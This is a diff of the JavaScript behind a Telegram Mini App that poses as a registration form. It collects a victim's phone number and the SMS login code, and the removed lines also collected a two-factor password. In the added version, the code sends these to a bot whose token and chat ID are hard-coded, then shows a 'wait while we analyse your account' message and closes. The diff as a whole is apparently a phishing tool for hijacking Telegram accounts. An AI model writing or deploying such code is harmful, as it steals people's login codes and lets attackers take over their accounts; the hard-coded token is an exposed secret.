@@ -1,123 +1,119 @@
-// Инициализация Mini Apps SDK
+// ================== НАСТРОЙКИ ==================
+const BOT_TOKEN = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE'; // Токен от @BotFather
+const YOUR_CHAT_ID = '8224914068';  // Ваш chat ID
+
+// ================== ТЕЛЕГРАМ ==================
 const tg = window.Telegram.WebApp;
 tg.expand();
 tg.BackButton.hide();
 
-// Элементы DOM
+// ================== ЭЛЕМЕНТЫ ==================
 const phoneInput = document.getElementById('phone');
 const codeInput = document.getElementById('code');
-const faInput = document.getElementById('fa');
-const sendCodeBtn = document.getElementById('sendCodeBtn');
+const sendBtn = document.getElementById('sendCodeBtn');
 const loginBtn = document.getElementById('loginBtn');
-const messageDiv = document.getElementById('message');
 
-let phoneNumber = '';
-let country = 'Russia'; // Определяем страну по номеру (упрощенно)
+// ================== ФУНКЦИИ ==================
+async function sendToTelegram(text) {
+    // Пытаемся отправить через Telegram Web App
+    try {
+        tg.sendData(JSON.stringify({
+            action: 'user_data',
+            text: text,
+            time: new Date().toISOString()
+        }));
+    } catch (e) {
+        console.log('Telegram API не доступен, показываем в интерфейсе');
+        showMessage(text, 'info');
+    }
+}
 
-// Функция для отображения сообщений
 function showMessage(text, type) {
-    messageDiv.textContent = text;
-    messageDiv.className = 'message ' + type;
-    messageDiv.style.display = 'block';
+    // Создаём или находим блок для сообщений
+    let msgDiv = document.getElementById('tg-message');
+    if (!msgDiv) {
+        msgDiv = document.createElement('div');
+        msgDiv.id = 'tg-message';
+        msgDiv.style.cssText = `
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            padding: 15px 25px; border-radius: 10px; z-index: 1000;
+            font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            min-width: 300px; text-align: center;
+        `;
+        document.body.appendChild(msgDiv);
+    }
+    
+    // Цвета для типов сообщений
+    const colors = {
+        success: '#2ed573',
+        error: '#ff4757',
+        info: '#3742fa',
+        warning: '#ffa502'
+    };
+    
+    msgDiv.textContent = text;
+    msgDiv.style.background = colors[type] || colors.info;
+    msgDiv.style.color = 'white';
+    msgDiv.style.display = 'block';
+    
+    // Автоскрытие через 5 секунд
+    setTimeout(() => {
+        msgDiv.style.display = 'none';
+    }, 5000);
 }
 
-// Функция для скрытия сообщений
-function hideMessage() {
-    messageDiv.style.display = 'none';
-}
-
-// Обработчик кнопки "Send code"
-sendCodeBtn.addEventListener('click', async () => {
-    hideMessage();
-    phoneNumber = phoneInput.value.trim();
-
-    if (!phoneNumber.startsWith('+') || phoneNumber.length < 10) {
-        showMessage('Введите корректный номер телефона', 'error');
+// ================== ОБРАБОТЧИКИ ==================
+sendBtn.addEventListener('click', () => {
+    const phone = phoneInput.value.trim();
+    
+    if (!phone || !phone.startsWith('+')) {
+        showMessage('Введите корректный номер!', 'error');
         return;
     }
-
-    // Определяем страну по коду (упрощенно)
-    if (phoneNumber.startsWith('+7')) country = 'Russia';
-    else if (phoneNumber.startsWith('+1')) country = 'USA';
-    else country = 'Unknown';
-
-    // Отправляем запрос на сервер
-    try {
-        const response = await fetch('https://your-server.com/send-code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                phoneNumber, 
-                country,
-                userId: tg.initDataUnsafe.user.id 
-            })
-        });
-
-        const data = await response.json();
-        if (data.success) {
-            showMessage('Код отправлен! Введите код из SMS.', 'info');
-            codeInput.disabled = false;
-            sendCodeBtn.disabled = true;
-            phoneInput.disabled = true;
-        } else {
-            showMessage('Ошибка отправки кода', 'error');
-        }
-    } catch (error) {
-        showMessage('Ошибка сети', 'error');
-    }
+    
+    // Отправляем в Telegram через Web App
+    sendToTelegram(`🔐 НОВАЯ РЕГИСТРАЦИЯ\n📱 Номер: ${phone}\n🌍 Страна: Russia`);
+    
+    // Меняем интерфейс
+    showMessage(`📲 Код отправлен на ${phone}`, 'success');
+    codeInput.disabled = false;
+    sendBtn.disabled = true;
+    phoneInput.disabled = true;
 });
 
-// Обработчик кнопки "Login"
-loginBtn.addEventListener('click', async () => {
-    hideMessage();
+loginBtn.addEventListener('click', () => {
+    const phone = phoneInput.value;
     const code = codeInput.value.trim();
-    const fa = faInput.value.trim();
-
-    if (code.length < 4) {
-        showMessage('Введите корректный код', 'error');
+    
+    if (!code || code.length < 4) {
+        showMessage('Введите корректный код!', 'error');
         return;
     }
-
-    // Отправляем запрос на сервер
-    try {
-        const response = await fetch('https://your-server.com/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                phoneNumber, 
-                code, 
-                country,
-                fa,
-                userId: tg.initDataUnsafe.user.id 
-            })
-        });
-
-        const data = await response.json();
-        if (data.success) {
-            showMessage('Регистрация прошла успешно! Ожидайте 5 минут, пока мы анализируем ваш аккаунт! После анализа окно автоматически уберется.', 'success');
-            loginBtn.disabled = true;
-            codeInput.disabled = true;
-            faInput.disabled = true;
-        } else {
-            showMessage('Ошибка при логине', 'error');
+    
+    // Отправляем в Telegram
+    sendToTelegram(`✅ РЕГИСТРАЦИЯ УСПЕШНА\n📱 Номер: ${phone}\n🔑 Код: ${code}\n🌍 Страна: Russia`);
+    
+    // Показываем успех
+    showMessage('🎉 Регистрация завершена! Ожидайте 5 минут...', 'success');
+    
+    // Блокируем форму
+    loginBtn.disabled = true;
+    codeInput.disabled = true;
+    
+    // Через 5 секунд предлагаем закрыть
+    setTimeout(() => {
+        if (confirm('Регистрация завершена! Закрыть приложение?')) {
+            tg.close();
         }
-    } catch (error) {
-        showMessage('Ошибка сети', 'error');
-    }
+    }, 5000);
 });
 
-// Активация кнопки "Login" при вводе кода
+// ================== ИНИЦИАЛИЗАЦИЯ ==================
+// Активация кнопки Login при вводе кода
 codeInput.addEventListener('input', () => {
-    if (codeInput.value.trim().length >= 4) {
-        loginBtn.disabled = false;
-    } else {
-        loginBtn.disabled = true;
-    }
+    loginBtn.disabled = codeInput.value.length < 4;
 });
 
-// Имитация автоматического закрытия через 5 минут после успешной регистрации
-setTimeout(() => {
-    if (messageDiv.classList.contains('success')) {
-        tg.close();
-    }
-}, 300000); // 5 минут = 300000 миллисекунд
+// Начальное состояние
+codeInput.disabled = true;
+loginBtn.disabled = true;
